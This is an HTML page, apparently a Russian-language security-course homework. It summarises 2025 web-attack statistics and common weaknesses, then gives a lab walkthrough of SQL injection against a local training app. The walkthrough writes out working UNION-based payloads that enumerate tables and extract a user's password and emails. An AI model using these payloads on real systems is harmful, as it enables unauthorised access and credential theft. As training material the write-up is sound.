@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h1>Часть I</h1>
+<h2>Статистика по тому, какую долю атак на компании проводят через веб-уязвимости, а также распределение по конкретным уязвимостям</h2>
+<h3>Источники:</h3>
+<ul>
+<li><a href="https://rt-solar.ru/analytics/reports/6432/">https://rt-solar.ru/analytics/reports/6432/</a></li>
+<li><a href="https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi">https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi</a></li>
+<li><a href="https://www.anti-malware.ru/analytics/Threat_Analysis/Web-Application-Security-Outlook-for-2025">https://www.anti-malware.ru/analytics/Threat_Analysis/Web-Application-Security-Outlook-for-2025</a></li>
+<li><a href="https://deepstrike.io/blog/vulnerability-statistics-2025">https://deepstrike.io/blog/vulnerability-statistics-2025</a></li>
+<li><a href="https://cybersecuritynews.com/most-exploited-vulnerabilities-of-2025/">https://cybersecuritynews.com/most-exploited-vulnerabilities-of-2025/</a></li>
+<li><a href="https://about.gitlab.com/blog/2025-owasp-top-10-whats-changed-and-why-it-matters/">https://about.gitlab.com/blog/2025-owasp-top-10-whats-changed-and-why-it-matters/</a></li>
+<li><a href="https://owasp.org/Top10/2025/0x00_2025-Introduction/">https://owasp.org/Top10/2025/0x00_2025-Introduction/</a></li>
+</ul>
+<h3>Кратко по каждому источнику:</h3>
+<h4>1. Солар:</h4>
+<p>Раздел с веб уязвимостями - Несанкционированный доступ.
+С точки зрения общего количества событий ИБ за прошедшие четыре года прослеживается тренд на снижение, однако до показателей 2022 года и ранее всё ещё далеко. Для РФ на горизонте четырёх лет по этому показателю видны отчетливые всплески, связанные с политической обстановкой. Например, значительный рост атак в 3 квартале 2022 г. был связан с вхождением новых территорий в состав РФ. При этом каждый год мы видим похожую «сезонность»: в начале года относительное затишье, затем рост числа инцидентов, причём в последние два года наиболее «ударным» во всех смыслах становится конец года.
+Категория С НСД занимает около 23%, где конкретно атаки на веб занимают около 2% от общего числа всех атак.</p>
+<p><strong>Динамика веб-атак в 2025 г.</strong>
+В России основные цели атак - госсектор и промышленность.</p>
+<h4>2. Comnews:</h4>
+<p>Растёт тренд на ИИ уязвимости (утечка данных и слабая безопасность).</p>
+<h4>3. Анти малваре:</h4>
+<p>Основной смысл атак на веб - не навредить оборудованию, а подшатнуть бизнес (падает выручка). Веб-приложения и API стали основной точкой давления из-за их доступности и высокой автоматизации атак.<br>Основные уязвимости:</p>
+<ul>
+<li>Самой заметной уязвимостью 2025 года стала React2Shell (CVE-2025-55182).</li>
+<li>Также самыми популярными стали:<ul>
+<li>CWE-79 — некорректная нейтрализация ввода во время генерации веб-страницы (XSS, межсайтовый скриптинг).</li>
+<li>CWE-89 — SQL-инъекция, которая даёт прямой доступ к данным и бизнес-логике.</li>
+<li>CWE-352 — подделка межсайтовых запросов (CSRF), которая позволяет выполнять действия от имени пользователя.</li>
+</ul>
+</li>
+</ul>
+<p>Тренды:</p>
+<ul>
+<li>Появление атак, выполненных практически полностью с помощью нейросетей (искусственного интеллекта), почти без участия человека. С помощью ИИ злоумышленники ускорили поиск уязвимостей, анализ патчей и разработку эксплойтов. Время между публикацией CVE и эксплуатацией сократилось до часов. Это требует моментальной реакции и, в свою очередь, повысило ценность защитных решений с ML и AI, которые позволяют находить аномалии и блокировать даже эксплуатацию 0-day уязвимостей.</li>
+</ul>
+<h4>4. Deepstrike:</h4>
+<p>In H1 2025, the top five weakness types by CWE classification were:</p>
+<ul>
+<li><strong>Cross Site Scripting (XSS)</strong>: Still the #1 most frequent vulnerability pattern in CVEs. XSS issues (CWE-79) appeared more than any other, enabling attackers to inject malicious scripts into web pages.</li>
+<li><strong>SQL Injection (SQLi)</strong>: A close second. Injection flaws involving SQL (CWE-89) remained widespread, allowing attackers to manipulate databases through insecure queries.</li>
+<li><strong>Cross Site Request Forgery (CSRF)</strong>: Another common bug (CWE-352), where attackers trick users&#39; browsers into unwittingly executing unwanted actions on a site where they’re authenticated.</li>
+<li><strong>Other Injection Flaws</strong>: Includes things like OS command injection or code injection grouped under CWE-74.</li>
+<li><strong>Missing Authorization</strong>: Weak access control (CWE-862) rounds out the top 5, meaning many CVEs involve cases where critical functions lacked proper permission checks.</li>
+</ul>
+<h4>5. CyberSecurityNews:</h4>
+<p>За 4 года приоритеты немного поменялись (выросла важность misconfiguration и supply chain, инъекции ушли с 3-го места на 5-е), но сломанный контроль доступа и проблемы конфигурации остаются самыми опасными.</p>
+<h3>Выводы по источникам:</h3>
+<ul>
+<li>Успешные атаки на организации через эксплуатацию веб‑уязвимостей составляют единицы процентов от всего массива кибератак, но уже десятки процентов среди инцидентов с реальным бизнес‑ущербом (простой сервисов, потеря выручки, утечки данных), так как веб‑приложения и API являются основной точкой давления на бизнес‑сервисы.</li>
+<li>Внутри самих веб‑инцидентов распределение по уязвимостям выглядит так: наибольший вклад дают XSS (CWE‑79) и SQL‑инъекции (CWE‑89), далее идут CSRF (CWE‑352) и прочие инъекции/десериализация (CWE‑74 и родственные), а также ошибки авторизации и сломанный контроль доступа (CWE‑862 и OWASP A01), которые по совокупному риску выходят в топ, даже если количественно встречаются реже, чем XSS.</li>
+</ul>
+<hr>
+<h1>Часть 2</h1>
+<p>Зашел на localhost, настроил базу, открылась страница - <code>http://localhost:8080/task/</code>, где надо ввести id.</p>
+<p>Попробовал разные запросы вида <code>http://localhost:8080/task/?id=n</code>.</p>
+<p>Нашёл Vinni-pukh - его id=4 и Volk2 - id=9.</p>
+<p>Есть предположение, что id просто подставляется в SQL запрос. Попробуем разные инъекции:</p>
+<p><code>http://localhost:8080/task/?id=1&#39;</code><br>Получаем ошибку:
+<em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</em><br>Это значит запрос имеет вид <code>SELECT * FROM table where id = &#39; id с сайта&#39; LIMIT 0,1;</code></p>
+<p>Попробуем выбрать все поля при помощи инъекции <code>1&#39; OR &#39;1&#39;=&#39;1&#39; -- -</code>:
+<code>http://localhost:8080/task/?id=1&#39; OR &#39;1&#39;=&#39;1&#39; -- -</code><br>Однако получаем только 1 запись — скорее всего скрипт подставляет первое значение в HTML.</p>
+<p>Попробую сделать инъекцию через UNION:
+Сначала нужно определить количество столбцов, используя:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,2,... -- -</code><br>Подбираем количество столбцов (в нашем случае 3). (-1 используется для того, чтобы <code>WHERE id=&#39;id с сайта&#39;</code> вернул пустоту, и значения заполнились с <code>UNION</code>).</p>
+<p>Теперь, когда у нас есть <code>UNION</code>, получим структуру БД с помощью запроса:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -</code><br><code>GROUP_CONCAT(table_name)</code> — склеиваем название таблиц, <code>information_schema.tables</code> — получаем информацию для конкретной БД.<br>Ответ:<br><code>Ваш id:1</code><br><code>Ваш логин:emails,users</code><br>Получаем две таблицы — Users и Emails.</p>
+<p>Узнаем структуру таблиц:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;users&#39; -- -</code><br>Ответ:<br><code>Ваш id:1</code><br><code>Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p>
+<p>Зная, что <code>id</code> пользователя Volk2=9, получим его пароль через запрос:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT username, password, 3 FROM users WHERE id=9 -- -</code><br>Ответ:<br><code>Ваш id:Volk2</code><br><code>Ваш логин:Wa spoiuuuuu - пароль</code></p>
+<p>Теперь узнаем почту Vinni-pukh (id=4):
+Сначала получим структуру таблицы <code>emails</code>:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;emails&#39; -- -</code><br>Ответ:<br><code>Ваш id:1</code><br><code>Ваш логин:id,email_id</code></p>
+<p>Получаем значения:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT id, email_id, 3 FROM emails -- -</code><br>Ответ:<br><code>Ваш id:1</code><br><code>Ваш логин:admin@otus-lab.com</code>  </p>
+<p>Для Вини пуха:
+<code>http://localhost:8080/task/?id=-1&#39; UNION SELECT id, email_id, 3 FROM emails WHERE id=4 -- -</code><br>Ответ:<br><code>Ваш id:4</code><br><code>Ваш логин:honey_lover@otus-lab.com</code> — email Вини пуха.</p>
+<h3>ИТОГ:</h3>
+<ul>
+<li><strong>Wa spoiuuuuu</strong> - пароль.</li>
+<li><strong><a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></strong> - email Вини пуха.</li>
+</ul>
+
+</body>
+</html>
